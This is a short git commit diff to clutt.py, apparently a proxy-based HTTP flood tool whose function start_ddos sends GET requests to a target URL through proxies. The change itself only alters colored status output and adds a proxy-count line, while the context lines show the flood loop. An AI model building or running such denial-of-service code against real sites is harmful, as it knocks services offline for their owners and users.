f5f43ffb1b319a97d41b882bb2d5c52b8a20a4c7
s3cr3tmod-xp <s3cr3tmod@gmail.com>
2026-07-21 20:59:20 +0700

    Update clutt.py

--- clutt.py
+++ clutt.py
@@ -77,7 +77,8 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"💥 get: {} | proxy ".format(prox))
+			print(color+"💥 get: {} | \033[38;5;220mproxy ".format(prox))
+			print(Back.YELLOW+Fore.GREEN+"{} new proxies".format(len(array))+Style.RESET_ALL)
 	except:
 		pass
 
